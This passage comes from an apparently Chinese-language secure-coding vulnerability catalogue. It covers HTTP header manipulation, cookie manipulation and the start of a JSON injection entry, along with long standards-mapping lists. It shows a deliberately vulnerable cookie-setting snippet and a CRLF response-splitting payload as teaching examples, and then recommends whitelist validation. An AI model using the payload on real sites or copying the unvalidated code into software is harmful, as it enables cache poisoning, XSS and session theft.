<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[24] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="Header-Manipulation"><a href="#Header-Manipulation" class="headerlink" title="Header Manipulation"></a>Header Manipulation</h4><h5 id="ABSTRACT-31"><a href="#ABSTRACT-31" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>HTTP 响应头文件中包含未验证的数据会引发 cache-poisoning、cross-site scripting、cross-user defacement、page hijacking、cookie manipulation 或 open redirect。</p>
<h5 id="EXPLANATION-31"><a href="#EXPLANATION-31" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>以下情况中会出现 Header Manipulation 漏洞：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序，最常见的是 HTTP 请求。</p>
</li>
<li><p>数据包含在一个 HTTP 响应头文件里，未经验证就发送给了 Web 用户。</p>
</li>
</ol>
<p>如同许多软件安全漏洞一样，Header Manipulation 只是通向终端的一个途径，它本身并不是终端。从本质上看，这些漏洞是显而易见的：一个攻击者将恶意数据传送到易受攻击的应用程序，且该应用程序将数据包含在 HTTP 响应头文件中。</p>
<p>其中最常见的一种 Header Manipulation 攻击是 HTTP Response Splitting。为了成功地实施 HTTP Response Splitting 盗取，应用程序必须允许将那些包含 CR（回车，由 %0d 或 \r 指定）和 LF（换行，由 %0a 或 \n 指定）的字符输入到头文件中。攻击者利用这些字符不仅可以控制应用程序要发送的响应剩余头文件和正文，还可以创建完全受其控制的其他响应。</p>
<p>如今的许多现代应用程序服务器可以防止 HTTP 头文件感染恶意字符。如果您的应用程序服务器能够防止设置带有换行符的头文件，则其具备对 HTTP Response Splitting 的防御能力。然而，单纯地过滤换行符可能无法保证应用程序不受 Cookie Manipulation 或 Open Redirects 的攻击，因此必须在设置带有用户输入的 HTTP 头文件时采取措施。</p>
<p>示例：下列代码片段会从 HTTP 请求中读取网络日志项的作者名字 author，并将其置于一个 HTTP 响应的 cookie 头文件中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">author = form.author.value;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">document.cookie = &quot;author=&quot; + author + &quot;;expires=&quot;+cookieExpiration;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>假设在请求中提交了一个字符串，该字符串由标准的字母数字字符组成，如“Jane Smith”，那么包含该 Cookie 的 HTTP 响应可能表现为以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Jane Smith</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然而，因为 cookie 值来源于未经校验的用户输入，所以仅当提交给 AUTHOR_PARAM 的值不包含任何 CR 和 LF 字符时，响应才会保留这种形式。如果攻击者提交的是一个恶意字符串，比如 “Wiley Hacker\r\nHTTP/1.1 200 OK\r\n……”，那么 HTTP 响应就会被分割成以下形式的两个响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Wiley Hacker</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>显然，第二个响应已完全由攻击者控制，攻击者可以用任何所需标头和正文内容构建该响应。如果攻击者可以构造任意 HTTP 响应，则会导致多种形式的攻击，包括：Web 和浏览器 Cache-Poisoning、Cross-Site Scripting 和 Page Hijacking。</p>
<p>Cache Poisoning： 如果多用户 Web 缓存或者单用户浏览器缓存将恶意构建的响应缓存起来，该响应的破坏力会更大。如果响应缓存在共享的 Web 缓存（如在代理服务器中常见的缓存）中，那么使用该缓存的所有用户都会不断收到恶意内容，直到清除该缓存项为止。同样，如果响应缓存在单个用户的浏览器中，那么在清除该缓存项以前，该用户会不断收到恶意内容。然而，影响仅局限于本地浏览器的用户。 </p>
<p>Cross-Site Scripting：一旦攻击者控制了应用程序传送的响应，就可以选择多种恶意内容来传播给用户。Cross-Site Scripting 是最常见的攻击形式，这种攻击在响应中包含了恶意的 JavaScript 或其他代码，并在用户的浏览器中执行。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。对于易受攻击的应用程序用户，最常见且最危险的攻击就是使用 JavaScript 将会话和 authentication 信息返回给攻击者，而后攻击者就可以完全控制受害者的帐号了。 </p>
<p>Page Hijacking：除了利用一个易受攻击的应用程序向用户传输恶意内容，还可以利用相同的根漏洞，将服务器生成的供用户使用的敏感内容重定向，转而供攻击者使用。攻击者通过提交一个会导致两个响应的请求，即服务器做出的预期响应和攻击者创建的响应，致使某个中间节点（如共享的代理服务器）误导服务器所生成的响应，将本来应传送给用户的响应错误地传给攻击者。因为攻击者创建的请求产生了两个响应，第一个被解析为针对攻击者请求做出的响应，第二个则被忽略。当用户通过同一 TCP 连接发出合法请求时，攻击者的请求已经在此处等候，并被解析为针对受害者这一请求的响应。这时，攻击者将第二个请求发送给服务器，代理服务器利用针对受害者（用户）的、由该服务器产生的这一请求对服务器做出响应，因此，针对受害者的这一响应中会包含所有头文件或正文中的敏感信息。</p>
<p>Cookie Manipulation：当与类似跨站请求伪造的攻击相结合时，攻击者就可以篡改、添加、甚至覆盖合法用户的 cookie。</p>
<p>Open Redirect：如果允许未验证的输入来控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</p>
<h5 id="RECOMMENDATIONS-31"><a href="#RECOMMENDATIONS-31" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 Header Manipulation 的解决方法是，确保在适当位置进行输入验证并检验其属性是否正确。</p>
<p>由于 Header Manipulation 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在应用程序输出数据前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态响应，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 Header Manipulation 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免出现其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是增强应用程序现有的输入验证机制，增加针对 Header Manipulation 的检查。尽管具有一定的价值，但 Header Manipulation 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储器或其他可信赖的数据源接受输入，而该数据存储器所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 Header Manipulation 漏洞的最佳方法是验证所有应用程序输入数据或向用户输出的数据。</p>
<p>针对 Header Manipulation 漏洞进行验证最安全的方式是创建一份安全字符白名单，其中的字符允许出现在 HTTP 响应头文件中，并且只接受完全由这些受认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，帐号可能仅包含 0-9 的数字。</p>
<p>更灵活的方法是列入黑名单，但其安全性较差，这种方法在使用输入之前就有选择地拒绝或转义了潜在的危险字符。为了创建这样的列表，首先需要了解在 HTTP 响应头文件中具有特殊含义的一组字符。尽管 CR 和 LF 字符是 HTTP Response Splitting 攻击的核心，但其他字符，如“:”（冒号）和 ‘=’（等号），在响应标头中同样具有特殊的含义。</p>
<p>在应用程序中确定针对 Header Manipulation 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。应用程序应拒绝任何要添加到 HTTP 响应头文件中的包含特殊字符的输入，这些特殊字符（特别是 CR 和 LF）是无效字符。</p>
<p>许多应用程序服务器都试图避免应用程序出现 HTTP Response Splitting 漏洞，其做法是为负责设置 HTTP 头文件和 cookie 的函数提供各种执行方式，以检验是否存在进行 HTTP Response Splitting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-31"><a href="#REFERENCES-31" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Klein Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics </p>
<p>[2] D. Crab HTTP Response Splitting </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 113 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Web Application Security Consortium 24 + 2 HTTP Response Splitting </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 HTTP Response Splitting (WASC-25) </p>
<h4 id="Header-Manipulation-Cookies"><a href="#Header-Manipulation-Cookies" class="headerlink" title="Header Manipulation: Cookies"></a>Header Manipulation: Cookies</h4><h5 id="ABSTRACT-32"><a href="#ABSTRACT-32" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在 Cookies 中包含未验证的数据会引发 HTTP 响应头文件操作攻击，并可能导致 cache-poisoning、cross-site scripting、cross-user defacement、page hijacking、cookie manipulation 或 open redirect。</p>
<h5 id="EXPLANATION-32"><a href="#EXPLANATION-32" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>以下情况中会出现 Cookie Manipulation 漏洞：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序，最常见的是 HTTP 请求。</p>
</li>
<li><p>数据包含在一个 HTTP Cookie 中，该 Cookie 未经验证就发送给了 Web 用户。</p>
</li>
</ol>
<p>如同许多软件安全漏洞一样，Cookie Manipulation 只是通向终端的一个途径，它本身并不是终端。从本质上看，这些漏洞是显而易见的：攻击者可将恶意数据传送到易受攻击的应用程序，然后该应用程序将这些数据包含在 HTTP Cookie 中。</p>
<p>Cookie Manipulation：当与类似跨站请求伪造的攻击相结合时，攻击者就可以篡改、添加、甚至覆盖合法用户的 cookie。</p>
<p>作为 HTTP 响应头文件，Cookie Manipulation 攻击也可导致其他类型的攻击，例如：</p>
<p>HTTP Response Splitting：</p>
<p>其中最常见的一种 Header Manipulation 攻击是 HTTP Response Splitting。为了成功地实施 HTTP Response Splitting 盗取，应用程序必须允许将那些包含 CR（回车，由 %0d 或 \r 指定）和 LF（换行，由 %0a 或 \n 指定）的字符输入到头文件中。攻击者利用这些字符不仅可以控制应用程序要发送的响应剩余头文件和正文，还可以创建完全受其控制的其他响应。</p>
<p>如今的许多现代应用程序服务器可以防止 HTTP 头文件感染恶意字符。例如，如果尝试使用被禁用的字符设置头文件，最新版本的 Apache Tomcat 会抛出 IllegalArgumentException。如果您的应用程序服务器能够防止设置带有换行符的头文件，则其具备对 HTTP Response Splitting 的防御能力。然而，单纯地过滤换行符可能无法保证应用程序不受 Cookie Manipulation 或 Open Redirects 的攻击，因此必须在设置带有用户输入的 HTTP 头文件时采取措施。</p>
<p>示例：下列代码片段会从 HTTP 请求中读取网络日志项的作者名字 author，并将其置于一个 HTTP 响应的 cookie 头文件中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">author = form.author.value;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">document.cookie = &quot;author=&quot; + author + &quot;;expires=&quot;+cookieExpiration;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>假设在请求中提交了一个字符串，该字符串由标准的字母数字字符组成，如“Jane Smith”，那么包含该 Cookie 的 HTTP 响应可能表现为以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Jane Smith</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然而，因为 cookie 值来源于未经校验的用户输入，所以仅当提交给 AUTHOR_PARAM 的值不包含任何 CR 和 LF 字符时，响应才会保留这种形式。如果攻击者提交的是一个恶意字符串，比如 <code>&quot;Wiley Hacker\r\nHTTP/1.1 200 OK\r\n......&quot;</code>，那么 HTTP 响应就会被分割成以下形式的两个响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Wiley Hacker</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>显然，第二个响应已完全由攻击者控制，攻击者可以用任何所需标头和正文内容构建该响应。攻击者可以构建任意 HTTP 响应，从而发起多种形式的攻击，包括：cross-user defacement、web and browser cache poisoning、cross-site scripting 和 page hijacking。</p>
<p>Cross-User Defacement：攻击者可以向一个易受攻击的服务器发出一个请求，导致服务器创建两个响应，其中第二个响应可能会被曲解为对其他请求的响应，而这一请求很可能是与服务器共享相同 TCP 连接的另一用户发出的。这种攻击可以通过以下方式实现：攻击者诱骗用户，让他们自己提交恶意请求；或在远程情况下，攻击者与用户共享同一个连接到服务器（如共享代理服务器）的 TCP 连接。最理想的情况是，攻击者通过这种方式使用户相信自己的应用程序已经遭受了黑客攻击，进而对应用程序的安全性失去信心。最糟糕的情况是，攻击者可能提供经特殊技术处理的内容，这些内容旨在模仿应用程序的执行方式，但会重定向用户的私人信息（如帐号和密码），将这些信息发送给攻击者。</p>
<p>Cache Poisoning： 如果多用户 Web 缓存或者单用户浏览器缓存将恶意构建的响应缓存起来，该响应的破坏力会更大。如果响应缓存在共享的 Web 缓存（如在代理服务器中常见的缓存）中，那么使用该缓存的所有用户都会不断收到恶意内容，直到清除该缓存项为止。同样，如果响应缓存在单个用户的浏览器中，那么在清除该缓存项以前，该用户会不断收到恶意内容。然而，影响仅局限于本地浏览器的用户。 </p>
<p>Cross-Site Scripting：一旦攻击者控制了应用程序传送的响应，就可以选择多种恶意内容来传播给用户。Cross-Site Scripting 是最常见的攻击形式，这种攻击在响应中包含了恶意的 JavaScript 或其他代码，并在用户的浏览器中执行。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。对于易受攻击的应用程序用户，最常见且最危险的攻击就是使用 JavaScript 将会话和 authentication 信息返回给攻击者，而后攻击者就可以完全控制受害者的帐号了。 </p>
<p>Page Hijacking：除了利用一个易受攻击的应用程序向用户传输恶意内容，还可以利用相同的根漏洞，将服务器生成的供用户使用的敏感内容重定向，转而供攻击者使用。攻击者通过提交一个会导致两个响应的请求，即服务器做出的预期响应和攻击者创建的响应，致使某个中间节点（如共享的代理服务器）误导服务器所生成的响应，将本来应传送给用户的响应错误地传给攻击者。因为攻击者创建的请求产生了两个响应，第一个被解析为针对攻击者请求做出的响应，第二个则被忽略。当用户通过同一 TCP 连接发出合法请求时，攻击者的请求已经在此处等候，并被解析为针对受害者这一请求的响应。这时，攻击者将第二个请求发送给服务器，代理服务器利用针对受害者（用户）的、由该服务器产生的这一请求对服务器做出响应，因此，针对受害者的这一响应中会包含所有头文件或正文中的敏感信息。</p>
<p>Open Redirect：如果允许未验证的输入来控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</p>
<h5 id="RECOMMENDATIONS-32"><a href="#RECOMMENDATIONS-32" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 Cookie Manipulation 的解决方法是，确保在适当位置进行输入验证并检验其属性是否正确。</p>
<p>由于 Header Manipulation 漏洞（类似于 Cookie Manipulation）出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在应用程序输出数据前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态响应，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 Header Manipulation 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免出现其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是增强应用程序现有的输入验证机制，增加针对 Header Manipulation 的检查。尽管具有一定的价值，但 Header Manipulation 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储器或其他可信赖的数据源接受输入，而该数据存储器所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 Header Manipulation 漏洞的最佳方法是验证所有应用程序输入数据或向用户输出的数据。</p>
<p>针对 Header Manipulation 漏洞进行验证最安全的方式是创建一份安全字符白名单，其中的字符允许出现在 HTTP 响应头文件中，并且只接受完全由这些受认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，帐号可能仅包含 0-9 的数字。</p>
<p>更灵活的方法是列入黑名单，但其安全性较差，这种方法在使用输入之前就有选择地拒绝或转义了潜在的危险字符。为了创建这样的列表，首先需要了解在 HTTP 响应头文件中具有特殊含义的一组字符。尽管 CR 和 LF 字符是 HTTP Response Splitting 攻击的核心，但其他字符，如“:”（冒号）和 ‘=’（等号），在响应标头中同样具有特殊的含义。</p>
<p>在应用程序中确定针对 Header Manipulation 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。应用程序应拒绝任何要添加到 HTTP 响应头文件中的包含特殊字符的输入，这些特殊字符（特别是 CR 和 LF）是无效字符。</p>
<p>许多应用程序服务器都试图避免应用程序出现 HTTP Response Splitting 漏洞，其做法是为负责设置 HTTP 头文件和 cookie 的函数提供各种执行方式，以检验是否存在进行 HTTP Response Splitting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-32"><a href="#REFERENCES-32" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Klein Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics </p>
<p>[2] D. Crab HTTP Response Splitting </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 113 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Web Application Security Consortium 24 + 2 HTTP Response Splitting </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 HTTP Response Splitting (WASC-25) </p>
<h4 id="JSON-Injection"><a href="#JSON-Injection" class="headerlink" title="JSON Injection"></a>JSON Injection</h4><h5 id="ABSTRACT-33"><a href="#ABSTRACT-33" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该方法会将未经验证的输入写入 JSON。攻击者可以利用此调用将任意元素或属性注入 JSON 实体。</p>
<h5 id="EXPLANATION-33"><a href="#EXPLANATION-33" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>JSON injection 会在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>将数据写入到 JSON 流。</p>
</li>
</ol>
<p>应用程序通常使用 JSON 来存储数据或发送消息。用于存储数据时，JSON 通常会像缓存数据那样处理，而且可能会包含敏感信息。用于发送消息时，JSON 通常与 RESTful 服务一起使用，并且可以用于传输敏感信息，例如身份验证凭据。</p>
